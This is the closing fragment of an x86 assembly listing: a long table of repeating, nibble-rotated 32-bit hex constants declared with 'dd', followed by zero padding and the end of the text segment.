		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 2DC196h, 18h	dup(0)
_text		ends


		end start
